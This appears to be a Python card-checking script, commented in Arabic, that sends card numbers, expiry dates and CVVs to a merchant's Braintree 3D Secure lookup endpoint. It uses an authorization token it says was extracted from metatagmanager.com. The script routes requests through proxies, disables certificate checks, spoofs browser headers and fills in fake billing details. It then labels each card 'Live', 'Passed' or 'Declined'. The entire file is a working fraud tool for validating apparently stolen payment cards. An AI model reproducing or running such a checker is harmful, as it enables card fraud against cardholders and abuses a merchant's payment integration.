"""
بوابة الدفع: Braintree 3DS Secure LookUp Single
الموقع: metatagmanager.com
نوع البوابة: Braintree 3DS Secure LookUp
تدفق الطلبات:
1. POST https://api.braintreegateway.com/merchants/6hf8wrmn2ztbkpr7/client_api/v1/payment_methods/{token}/three_d_secure/lookup -> التحقق من حالة 3DS
"""
import aiohttp
import asyncio
import uuid
import ssl

MERCHANT_ID = "6hf8wrmn2ztbkpr7"
MERCHANT_SITE = "www.metatagmanager.com"
# ملاحظة: التوكن الثابت المستخرج من الموقع — يجب تحديثه دورياً
STATIC_TOKEN = "tokenc_bh_q56thc_p4vmcq_2s6xz3_r6q9zz_sv7"


async def req1_3ds_lookup(
    session: aiohttp.ClientSession,
    cc: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 1: إجراء 3DS Secure LookUp باستخدام التوكن الثابت."""
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": f"https://{MERCHANT_SITE}",
        "referer": f"https://{MERCHANT_SITE}/",
        "sec-ch-ua": '\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '\"Windows\"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    }
    data = {
        "amount": "10.00",
        "additionalInfo": {
            "billingLine1": "123 Street",
            "billingCity": "New York",
            "billingPostalCode": "10001",
            "billingCountryCode": "US",
            "billingGivenName": "John",
            "billingSurname": "Doe",
        },
        "challengeRequested": True,
        "bin": cc[:6],
        "dfReferenceId": str(uuid.uuid4()),
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.94.0",
        },
        "authorizationFingerprint": STATIC_TOKEN,
        "braintreeLibraryVersion": "braintree/web/3.94.0",
        "_meta": {
            "merchantAppId": MERCHANT_SITE,
            "platform": "web",
            "sdkVersion": "3.94.0",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": str(uuid.uuid4()),
        },
    }
    try:
        async with session.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/{STATIC_TOKEN}/three_d_secure/lookup",
            headers=headers,
            json=data,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req1_3ds_lookup failed: {e}") from e


async def process_B3_LookUp_single_secure(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree 3DS Secure LookUp Single."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            res = await req1_3ds_lookup(session, cc, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    status = res.get("status", "")

    if status == "challenge_required":
        return f"𝐋𝐢𝐯𝐞 ✅ | {cc}|{mes}|{ano}|{cvv}", "Challenge Required"
    elif status == "authenticate_successful":
        return f"𝐏𝐚𝐬𝐬𝐞𝐝 ✅ | {cc}|{mes}|{ano}|{cvv}", "Authenticate Successful"
    elif status == "authenticate_rejected":
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", "Authenticate Rejected"
    else:
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", f"Status: {status}"
